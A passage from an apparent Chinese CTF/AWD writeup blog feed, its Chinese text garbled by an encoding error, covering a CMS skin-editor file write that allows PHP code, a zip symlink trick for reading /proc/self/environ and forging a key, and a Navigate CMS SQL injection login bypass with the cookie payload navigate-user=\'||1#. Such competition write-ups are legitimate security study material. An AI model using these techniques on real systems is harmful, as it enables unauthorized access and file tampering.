admin&#x2F;adminç™»å½•åè¿›å…¥åå°ï¼Œè¯·æ±‚è·¯ç”±m&#x3D;system&amp;s&#x3D;changeskin&amp;a&#x3D;saveFileCodeï¼ˆæˆ‘æ²¡æ‰¾åˆ°è¿™éƒ¨åˆ†çš„é…ç½®æ–‡ä»¶ï¼Œå¸Œæœ›æœ‰å¸ˆå‚…å¯ä»¥æŒ‡ç‚¹ä¸€ä¸‹ï¼‰ã€‚</p><p>é€šè¿‡ç»éªŒæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹adminiç›®å½•ä¸‹çš„controllers&#x2F;systemç›®å½•ä¸‹çš„changeskin.phpçš„saveFileCodeå‡½æ•°ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveFileCode</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$request</span>,<span class="variable">$fileCode</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileCode&#x27;</span>]))<span class="keyword">die</span>(<span class="string">&#x27;æ•°æ®ä¸ºç©ºï¼&#x27;</span>);</span><br><span class="line"><span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>] = <span class="title function_ invoke__">filter_submitpath</span>( <span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>] );<span class="comment">//è¿‡æ»¤ok</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fname</span>    = <span class="title function_ invoke__">array_pop</span>( <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>]) );</span><br><span class="line"><span class="variable">$keditFileTypes</span>  = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;htm&#x27;</span>,<span class="string">&#x27;xml&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>,<span class="string">&#x27;js&#x27;</span>,<span class="string">&#x27;css&#x27;</span>);</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">extendName</span>(<span class="variable">$fname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$ext</span>) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$keditFileTypes</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;0::æ­¤ç±»å‹æ–‡ä»¶ä¸å…è®¸ç¼–è¾‘&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$curFile</span> = <span class="title function_ invoke__">get_abs_skin_root</span>().<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$curFile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$filesizelimit</span>=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;shtml&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;html&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;htm&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;xml&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;log&#x27;</span>=&gt;<span class="number">200</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="number">200</span>,<span class="string">&#x27;js&#x27;</span>=&gt;<span class="number">300</span>,<span class="string">&#x27;css&#x27;</span>=&gt;<span class="number">200</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">cnStrLen</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileCode&#x27;</span>])&gt;<span class="number">1024</span>*<span class="variable">$filesizelimit</span>[<span class="variable">$ext</span>]) <span class="keyword">die</span>(<span class="string">&#x27;æ­¤æ–‡ä»¶è¶…è¿‡&#x27;</span>.<span class="variable">$filesizelimit</span>[<span class="variable">$ext</span>].<span class="string">&#x27;kï¼Œç¦æ­¢æ“ä½œï¼&#x27;</span>);</span><br><span class="line"><span class="variable">$fileExt</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>],<span class="title function_ invoke__">strpos</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fileExt</span>==<span class="string">&#x27;php&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;html&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;htm&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;shtml&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;css&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;js&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;xml&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;log&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;txt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*è¿˜åŸ ä¿¡æ¯  å¼€å§‹*/</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;--n--&gt;&#x27;</span>, <span class="variable">$request</span>[<span class="string">&#x27;fileCode&#x27;</span>]);   <span class="comment">//æ¢è¡Œç¬¦è½¬ä¹‰é¿å…è¢«ä¸‹é¢çš„æ ‡ç­¾è¿‡æ»¤æ‰åæ–œæ </span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);               <span class="comment">//è¿‡æ»¤æ–‡ä»¶æ•æ„Ÿä¿¡æ¯</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;##&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$str</span>);   <span class="comment">//jsè½¬ç æ›¿ä»£æ–¹æ¡ˆ</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;####&#125;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$str</span>);   <span class="comment">//è¿æ¥ç¬¦</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;--n--&gt;&#x27;</span>, PHP_EOL, <span class="variable">$str</span>);                <span class="comment">//è½¬ä¹‰åçš„æ¢è¡Œç¬¦å†è½¬ä¹‰å›æ¥</span></span><br><span class="line">        <span class="comment">/*è¿˜åŸ ä¿¡æ¯  ç»“æŸ*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$str</span>)!=<span class="string">&#x27;UTF-8&#x27;</span> &amp;&amp; <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$str</span>)!=<span class="string">&#x27;ASCII&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$curFile</span>);</span><br><span class="line"><span class="title function_ invoke__">string2file</span>(<span class="string">&#x27;å°Šæ•¬çš„ç”¨æˆ·ï¼Œè¯¥æ–‡ä»¶ä¸æ˜¯utf8ç¼–ç  ï¼Œè¯·å°†åŸæ–‡ä»¶ä»£ç æ‰‹åŠ¨ç²˜è´´åˆ°æ­¤,ä¿å­˜ï¼Œå¹¶æŒ‰æç¤ºä¿®æ”¹&#x27;</span>,<span class="variable">$curFile</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;ç²˜è´´æ–‡æœ¬è¯·å…ˆè½¬ç æˆutf8ç¼–ç &#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">string2file</span>(<span class="variable">$str</span>,<span class="variable">$curFile</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;ç¼–è¾‘æˆåŠŸ&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;fobidden&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$curFile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;ç¦æ­¢æ“ä½œï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;æ­¤æ–‡ä»¶ç¦æ­¢æ“ä½œï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤æ¯”è¾ƒå¤šï¼Œä¸€å±‚å±‚çœ‹ï¼Œé¦–å…ˆç¦æ­¢ç›®å½•ç©¿è¶Šï¼Œæ£€æµ‹åˆ°å¦‚æœå­˜åœ¨è¯¥æ–‡ä»¶æ‰è¿›è¡Œå†™å…¥ï¼Œä¸”å†™å…¥åç¼€å…è®¸ä¸ºphpåç¼€ï¼Œæœ€åè¿›è¡Œä¸€ä¸ªå†™å…¥æ–‡ä»¶çš„æ“ä½œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”Ÿæˆæ–°çš„æ–‡ä»¶($strä¸ºå­—ç¬¦ä¸²,$filePathä¸ºç”Ÿæˆæ—¶çš„æ–‡ä»¶è·¯å¾„åŒ…æ‹¬æ–‡ä»¶å)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string2file</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$filePath</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="comment">//å»é™¤bom</span></span><br><span class="line">    <span class="variable">$contents</span>   = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    <span class="variable">$charset</span>[<span class="number">1</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$charset</span>[<span class="number">2</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$charset</span>[<span class="number">3</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$charset</span>[<span class="number">1</span>]) == <span class="number">239</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$charset</span>[<span class="number">2</span>]) == <span class="number">187</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$charset</span>[<span class="number">3</span>]) == <span class="number">191</span>) &#123;</span><br><span class="line">       <span class="variable">$str</span>=<span class="string">&quot;\xEF\xBB\xBF&quot;</span>.<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$filePath</span>,<span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™å®Œè¯»æ–‡ä»¶å®Œäº‹ï¼Œæ„Ÿè°¢å¸ˆå‚…çš„åˆ†äº«ã€‚</p><h2 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h2><p>è¿™å¤©çš„èµ›åˆ¶æ˜¯awd+ï¼Œbreak+fixã€‚è¿™å¤©æˆ‘æ‰“çš„å¾ˆæ··ï¼ŒWebæ²¡è¾“å‡ºå±å®èƒŒé”…ï¼ŒPWNçˆ·æ‰“äº†ä¸¤é¢˜ï¼Œæœ€åæˆ‘ä»¬æ‹¿åˆ°äº†ç¬¬ä¸€åã€‚</p><p>Web4æ˜¯å”¯ä¸€ä¸€é¢˜æœ‰è§£çš„é¢˜ï¼Œå‡ ä¹æ’äº†HCTFçš„åŸé¢˜ï¼ŒæŒ‡è·¯hide and seek</p><p><a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#hide-and-seek">https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#hide-and-seek</a></p><p><a href="https://ox1234.github.io/2019/03/27/HCTF%202018%20hide%20and%20seek%E5%A4%8D%E7%9B%98/">https://ox1234.github.io/2019/03/27/HCTF%202018%20hide%20and%20seek%E5%A4%8D%E7%9B%98/</a></p><p>å…¶å®è€ƒå¯Ÿçš„å°±æ˜¯zipåŒ…è§£å‹è½¯é“¾æ¥çš„é—®é¢˜ï¼Œä¸æ˜¯ä¸€ä¸ªæ–°è€ƒç‚¹ï¼Œåˆ©ç”¨è½¯é“¾æ¥è¯»å–æ–‡ä»¶&#x2F;proc&#x2F;self&#x2F;cmdlineæŸ¥çœ‹è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å½“å‰æ‰§è¡Œäº†ä¸€ä¸ªç±»ä¼¼cat upload&#x2F;xxx&#x2F;xxxè¿™æ ·çš„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥è°ƒç”¨å‘½ä»¤è¡Œè¯»å–æ–‡ä»¶ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥ç”¨è½¯é“¾æ¥çš„åŸå› ã€‚</p><p>æ¥ç€è¯»å–&#x2F;proc&#x2F;self&#x2F;envionï¼Œå¯ä»¥æ‰¾åˆ°é…ç½®æ–‡ä»¶wsgi.iniçš„ä½ç½®ï¼Œæ‰¾åˆ°åº”ç”¨çš„ç›®å½•ã€‚</p><p>è¯»å–æ–‡ä»¶ä¹‹åå‘ç°secret.keyæ˜¯é€šè¿‡uuid.getnode()ï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°macåœ°å€æ¥å½“åšseed</p><p>è¯»å–æ–‡ä»¶&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addressï¼Œè½¬æˆåè¿›åˆ¶ï¼Œé€šè¿‡ä¼ªé€ æ¥è¶Šæƒã€‚</p><p>ï¼ˆç”±äºæ­ä¸èµ·æ¥ç¯å¢ƒï¼Œå…¨é yyäº†ï¼‰</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ¬¡awdè¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿çš„ï¼Œä»¥å‰æ‰“çš„awdæˆ‘å°±æ˜¯çº¯æ··å­ï¼Œå¾ˆå¤šäº‹æƒ…éƒ½ä¸ä¼šåšï¼Œè¿™æ¬¡å­¦åˆ°äº†å¾ˆå¤šå§¿åŠ¿ï¼Œæ¶¨äº†å¾ˆå¤šè§è¯†ã€‚</p><ul><li>å‡†å¤‡å¥½è‡ªå·±è¯»å¾—æ‡‚çš„ä¼šç”¨çš„ä¼šæ”¹çš„æ”»å‡»è„šæœ¬å’Œé˜²å¾¡è„šæœ¬ï¼Œè¿™ä¸ªå°±ä¸ç”¨å¤šè¯´äº†ã€‚</li><li>æ ¹æ®èµ›åˆ¶éšæœºåº”å˜å§ï¼Œæ¯”å¦‚è¿™æ¬¡è¯¸å¦‚æ‹¿flagçš„æ–¹å¼å’Œæƒé™éƒ½åšäº†å¾ˆå¤šé™åˆ¶ï¼Œå¾ˆå¤šå›ºæœ‰çš„awdå¥—è·¯éƒ½ä¸èƒ½ç”¨äº†ï¼Œåˆè¡ç”Ÿäº†å¾ˆå¤šæ–°çš„æŒ–æ´æ€è·¯ï¼›è¿˜æœ‰å°±æ˜¯è¦æœ‰ä¸€ä¸ªå¥½å¿ƒæ€ï¼Œå¿ƒæ€ä¸èƒ½å…ˆå´©äº†ï¼Œè¿™æ¬¡å¿ƒæ€è¿˜ç®—å¯ä»¥ï¼Œæ„Ÿè°¢é˜Ÿå‹ä¸éª‚æˆ‘ã€‚</li><li>çœ‹æµé‡yydsï¼Œå¥½å¥½çœ‹æµé‡ï¼Œå°±ç®—åªæ˜¯çœ‹æµé‡+å†™exp+patchï¼Œflagæ€»ä¼šæœ‰çš„ã€‚</li><li>webçš„ä»£ç å®¡è®¡å’Œæ•æ„Ÿå‡½æ•°å®¡æŸ¥éƒ½å¾ˆé‡è¦ï¼Œå‰è€…å¯ä»¥å…¨å±€åˆ†æï¼Œåè€…å¯ä»¥å¿«é€Ÿå®šä½æ¼æ´ã€‚</li><li>PWNå°±æ˜¯çˆ·</li></ul><p>å…¶ä»–å°±ä¸å¤šè¯´äº†ï¼Œå¾ˆå¤šawdåˆ†äº«éƒ½å†™äº†å¾ˆè¯¦ç»†äº†ï¼Œæ„Ÿè°¢ä¸»åŠæ–¹ç»™æˆ‘ä»¬å¸¦æ¥ç²¾å½©çš„å‘¨æœ«ã€‚</p><p><a href="https://oatmeal.vip/tag/awd/">AWD</a><a href="https://oatmeal.vip/tag/ctf/">CTF</a><a href="https://oatmeal.vip/tag/web/">WEB</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Day3&quot;&gt;&lt;a href=&quot;#Day3&quot; class=&quot;headerlink&quot; title=&quot;Day3&quot;&gt;&lt;/a&gt;Day3&lt;/h2&gt;&lt;p&gt;ç¬¬ä¸€å¤©èµ›åˆ¶æ˜¯awd+å¯ä¿¡è®¡ç®—ï¼Œawdå…ˆæ”¾äº†ä¸¤é“webä¸¤é“pwnï¼Œå¯ä¿¡è®¡ç®—æ”¾äº†ä¸€é¢˜ã€‚æ”¾çš„webåˆ†åˆ«æ˜¯10.1.x.2å’Œ10.1</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="PHPååºåˆ—åŒ–" scheme="https://lhhxs.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2022é¹åŸæ¯web</title>
    <link href="https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/"/>
    <id>https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/</id>
    <published>2022-09-09T16:28:27.555Z</published>
    <updated>2022-09-09T16:37:00.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BY-æ’æ˜Ÿå®éªŒå®¤"><a href="#BY-æ’æ˜Ÿå®éªŒå®¤" class="headerlink" title="BY æ’æ˜Ÿå®éªŒå®¤"></a>BY æ’æ˜Ÿå®éªŒå®¤</h1><h2 id="é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹-yu22x"><a href="#é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹-yu22x" class="headerlink" title="é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹ (yu22x)"></a>é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹ (yu22x)</h2><p>æ‰«æåå°å‘ç°å­˜åœ¨.gitï¼Œåˆ©ç”¨githackå·¥å…·æ‹¿åˆ° .git æ–‡ä»¶å¤¹ï¼Œåˆ©ç”¨ git log æŸ¥çœ‹ commit idï¼Œåˆ©ç”¨ git reset â€“hard be50c81b903b0005d0740d221e74c51340251bc2 è¿›è¡Œæ¢å¤æ‹¿åˆ°æºç ã€‚<br><img src="https://img-blog.csdnimg.cn/6c5bf48b38d14e06bad3a4e65b6920c8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/35dbcf739e3c412b80e44aa0d2ce1c9e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/d37070300c914c32ad1cccfef418c7e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é€šè¿‡åå°æ‰«æè¿˜å‘ç°å­˜åœ¨login.php<br><img src="https://img-blog.csdnimg.cn/6d46cd452c9d42749ef08ebac3968f2e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ ¹æ®åº•éƒ¨ä¿¡æ¯è·å–åˆ°äº†cmsç±»å‹ä»¥åŠç‰ˆæœ¬å·ï¼Œç›´æ¥ç½‘ä¸Šæœç›¸å¯¹åº”çš„æ¼æ´ã€‚<br><img src="https://img-blog.csdnimg.cn/179005a01e7b4dd5a06ef260ce35d3f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°äº†è¿™ä¹ˆä¸€æ¡ï¼Œè¯´åœ¨login.phpä¸­å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚ä¸è¿‡æ²¡æœ‰ç»™pocã€‚<br>ä½†æ˜¯å¯ä»¥æ ¹æ®äº§å•†ç»™çš„è¡¥ä¸è¿›è¡Œåˆ†æ<br><img src="https://img-blog.csdnimg.cn/5f822fc285f04f079f93441bdbdd189d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­å¯¹login.phpçš„æ”¹åŠ¨ä¸»è¦å†…å®¹å¦‚ä¸‹<br><img src="https://img-blog.csdnimg.cn/769d4e9a4ccd434397a2163693f50f60.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ›´æ¢äº†ä¸€æ¡ä»£ç ï¼Œå…¶ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°ç”±åŸæ¥çš„å¯æ§å€¼æ”¹æˆäº†å›ºå®šå€¼ï¼Œå¹¶ä¸”å¢åŠ äº†ç¬¬å››ä¸ªå‚æ•°ã€‚<br>è·Ÿè¿›protectå‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/8a2b8a43f025419e91a4ae43324224e7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ç€è·Ÿè¿›<code>$DB-&gt;protect</code><br><img src="https://img-blog.csdnimg.cn/e9260e48c1184f21b5b2afab6bb7d8d6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯¹äºæˆ‘ä»¬æ¥è¯´çš„å½±å“åªæœ‰ä¸€æ¡ï¼Œå°±æ˜¯ä¼šå°†å•å¼•å·å‰é¢å¢åŠ åæ–œæ ã€‚<br>è·Ÿè¿›query_single<br><img src="https://img-blog.csdnimg.cn/0ecf373ec94a4c54a7bfc116f29bd99b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€ä¸»è¦çš„æ˜¯è¿›è¡Œäº†æŸ¥è¯¢è¯­å¥ï¼Œå¹¶ä¸”æŸ¥è¯¢è¯­å¥ä¸­çš„<code>$where</code>æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯<br><code>&#39;cookie_hash = &#39;.protect($_COOKIE[&#39;navigate-user&#39;])</code><br>å¹¶ä¸”æŸ¥è¯¢æˆåŠŸä¼šè·³è½¬åˆ°é¦–é¡µï¼ˆç›¸å½“äºç™»å½•æˆåŠŸï¼‰<br><img src="https://img-blog.csdnimg.cn/872fc9c16e7945b19b201fd8c005438a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°†ä»£ç ç®€å•æ•´ç†ä¸‹ï¼Œå¤§è‡´è¿‡ç¨‹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">protect</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>.<span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">            <span class="variable">$str</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$column</span>=<span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="variable">$table</span>=<span class="string">&#x27;nv_users&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$where</span>=<span class="string">&#x27;cookie_hash = &#x27;</span>.<span class="title function_ invoke__">protect</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&#x27;SELECT &#x27;</span> . <span class="variable">$column</span> . <span class="string">&#x27; FROM &#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27; WHERE &#x27;</span> . <span class="variable">$where</span> . <span class="variable">$order</span> . <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>; </span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±æ˜¯æ€ä¹ˆä¼ cookieå¯ä»¥ç”Ÿæˆä¸‡èƒ½å¯†ç ã€‚<br>å› ä¸ºè¿‡æ»¤ä¼šåœ¨å•å¼•å·å‰é¢å¢åŠ åæ–œæ ï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±å†™ä¸ªåæ–œæ åˆ™å¯ä»¥è½¬ç§»æ‰ã€‚<br><img src="https://img-blog.csdnimg.cn/957c01aea0f3454ab5a0b18308998cb8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹Ÿå°±æ˜¯cookieä¼ å…¥<code>navigate-user=\&#39;||1#</code> å³å¯ç™»å½•æˆåŠŸã€‚<br><img src="https://img-blog.csdnimg.cn/aa91c328837a4fec966d69e13399a3a2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿›å…¥åå°åï¼Œè¿˜æ˜¯æœä¸‹å†å²æ¼æ´ï¼Œå…¶ä¸­æœ‰ä¸ªå¼•èµ·äº†æˆ‘çš„æ³¨æ„ã€‚<br><img src="https://img-blog.csdnimg.cn/199105972d7446a8871cd96428aebdfd.png" 